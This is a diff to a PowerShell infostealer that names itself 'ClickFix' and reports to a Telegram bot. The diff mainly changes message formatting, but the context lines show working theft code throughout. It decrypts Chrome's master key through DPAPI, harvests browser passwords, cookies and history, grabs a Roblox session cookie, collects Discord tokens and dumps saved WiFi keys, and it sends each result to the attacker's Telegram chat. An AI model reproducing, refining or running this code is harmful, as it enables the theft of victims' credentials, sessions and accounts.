@@ -3,8 +3,11 @@ $tgChat = "-1003960241194"
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $tgBase = "https://api.telegram.org/bot$tgToken"
 
+$lt = [char]0x3C
+$gt = [char]0x3E
 function ts($m) {
-  $b = @{chat_id=$tgChat;text=$m;parse_mode="HTML";disable_web_page_preview=$true} | ConvertTo-Json
+  $t = "$lt" + "b$gt" + "$m" + "$lt" + "/b$gt"
+  $b = @{chat_id=$tgChat;text=$t;parse_mode="HTML";disable_web_page_preview=$true} | ConvertTo-Json
   for ($i = 0; $i -lt 3; $i++) {
     try { Invoke-RestMethod -Uri "$tgBase/sendMessage" -Method Post -Body $b -ContentType "application/json" -TimeoutSec 15 -ErrorAction Stop | Out-Null; break }
     catch { if ($i -ge 2) { break }; Start-Sleep -Seconds 2 }
@@ -12,7 +15,7 @@ function ts($m) {
   Start-Sleep -Milliseconds 500
 }
 
-ts "🚀 <b>ClickFix started</b>"
+ts "`u{1f680} ClickFix started"
 
 try {
   $ip = try { (Invoke-WebRequest -Uri "https://api.ipify.org" -TimeoutSec 10 -UseBasicParsing).Content } catch { try { (New-Object Net.WebClient).DownloadString("https://api.ipify.org") } catch { "Unknown" } }
@@ -20,8 +23,8 @@ try {
   $cpu = try { (Get-WmiObject Win32_Processor).Name } catch { "Unknown" }
   $ram = try { [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 0) } catch { 0 }
   $user = $env:USERNAME; $comp = $env:COMPUTERNAME; $dom = $env:USERDOMAIN
-  ts "💻 <b>System:</b>&#10;IP: $ip | User: $user@$comp ($dom)&#10;OS: $os | CPU: $cpu | RAM: ${ram}GB"
-} catch { ts "⚠️ <b>System info error:</b> $_" }
+  ts "`u{1f4bb} System:`nIP: $ip | User: $user@$comp ($dom)`nOS: $os | CPU: $cpu | RAM: ${ram}GB"
+} catch { ts "`u{26a0}`u{fe0f} System info error: $_" }
 
 try {
   Add-Type @"
@@ -65,8 +68,8 @@ ret=BDec(hk,c,(uint)c.Length,ref ai,null,0,op,(uint)op.Length,out rl,0);
 Marshal.FreeHGlobal(np); Marshal.FreeHGlobal(tp); BDesKey(hk); BClose(ha,0);
 if(ret!=0)return null; Array.Resize(ref op,(int)rl); return op; } }
 "@
-  ts "🔐 <b>Crypto module:</b> ✅ Compiled OK"
-} catch { ts "⚠️ <b>Crypto module failed:</b> $_"; exit }
+  ts "`u{1f510} Crypto module:`n`u{2705} Compiled OK"
+} catch { ts "`u{26a0}`u{fe0f} Crypto module failed: $_"; exit }
 
 $chromeKey = $null
 try {
@@ -78,11 +81,11 @@ try {
       $raw = [Convert]::FromBase64String($encKey)
       $dpapiBlob = $raw[5..($raw.Length - 1)]
       $chromeKey = [N]::DPD($dpapiBlob)
-      if ($chromeKey) { ts "🔑 <b>Chrome master key:</b> ✅ $($chromeKey.Length) bytes" }
-      else { ts "🔑 <b>Chrome master key:</b> ❌ Decryption failed" }
+      if ($chromeKey) { ts "`u{1f511} Chrome master key:`n`u{2705} $($chromeKey.Length) bytes" }
+      else { ts "`u{1f511} Chrome master key:`n`u{274c} Decryption failed" }
     }
-  } else { ts "🔑 <b>Chrome master key:</b> ❌ Local State not found" }
-} catch { ts "⚠️ <b>Chrome key error:</b> $_" }
+  } else { ts "`u{1f511} Chrome master key:`n`u{274c} Local State not found" }
+} catch { ts "`u{26a0}`u{fe0f} Chrome key error: $_" }
 
 $pwCount = 0; $ckCount = 0; $histCount = 0; $robCookie = $null
 $browserReports = @()
@@ -95,7 +98,7 @@ $browsers = @(
 
 foreach ($browser in $browsers) {
   $bName = $browser[0]; $basePath = $browser[1]
-  if (!(Test-Path $basePath)) { $browserReports += "🌐 <b>$bName:</b> ❌ Not installed"; continue }
+  if (!(Test-Path $basePath)) { $browserReports += "`u{1f310} ${bName}:`n`u{274c} Not installed"; continue }
   $profiles = @("Default")
   try { Get-ChildItem "$basePath\Profile *" -Directory -ErrorAction SilentlyContinue | ForEach-Object { $profiles += $_.Name } } catch {}
   $bpw = 0; $bck = 0; $bhist = 0; $bRoblox = $null
@@ -189,12 +192,12 @@ foreach ($browser in $browsers) {
     }
   }
 
-  $browserReports += "🌐 <b>$bName:</b> ✅ $bpw pw, $bck ck, $bhist hist"
+  $browserReports += "`u{1f310} ${bName}:`n`u{2705} $bpw pw, $bck ck, $bhist hist"
 }
 
-ts ($browserReports -join "&#10;")
+ts ($browserReports -join "`n")
 
-if ($robCookie) { ts "🎲 <b>Roblox cookie:</b> ✅ $robCookie" } else { ts "🎲 <b>Roblox cookie:</b> ❌ Not found" }
+if ($robCookie) { ts "`u{1f3b2} Roblox cookie:`n`u{2705} $robCookie" } else { ts "`u{1f3b2} Roblox cookie:`n`u{274c} Not found" }
 
 try {
   $dcDirs = @("$env:APPDATA\discord", "$env:APPDATA\discordcanary", "$env:APPDATA\discordptb", "$env:APPDATA\discorddevelopment")
@@ -209,8 +212,8 @@ try {
       }
     }
   }
-  if ($tokens.Count -gt 0) { ts "🎮 <b>Discord tokens ($($tokens.Count)):</b> $($tokens -join '&#10;')" } else { ts "🎮 <b>Discord tokens:</b> ❌ Not found" }
-} catch { ts "⚠️ <b>Discord scan error:</b> $_" }
+  if ($tokens.Count -gt 0) { ts "`u{1f3ae} Discord tokens ($($tokens.Count)):`n$($tokens -join "`n")" } else { ts "`u{1f3ae} Discord tokens:`n`u{274c} Not found" }
+} catch { ts "`u{26a0}`u{fe0f} Discord scan error: $_" }
 
 try {
   $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
@@ -218,9 +221,9 @@ try {
   foreach ($ssid in $wifiProfiles) {
     $detail = netsh wlan show profile name="$ssid" key=clear
     $pw = $detail | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() }
-    $wifiList += "$ssid: $pw"
+    $wifiList += "${ssid}: $pw"
   }
-  if ($wifiList.Count -gt 0) { ts "📡 <b>WiFi ($($wifiList.Count) networks):</b> $($wifiList -join ' | ')" } else { ts "📡 <b>WiFi:</b> ❌ No profiles found" }
-} catch { ts "⚠️ <b>WiFi error:</b> $_" }
+  if ($wifiList.Count -gt 0) { ts "`u{1f4e1} WiFi ($($wifiList.Count) networks):`n$($wifiList -join ' | ')" } else { ts "`u{1f4e1} WiFi:`n`u{274c} No profiles found" }
+} catch { ts "`u{26a0}`u{fe0f} WiFi error: $_" }
 
-ts "✅ <b>All phases complete</b>"
+ts "`u{2705} All phases complete"
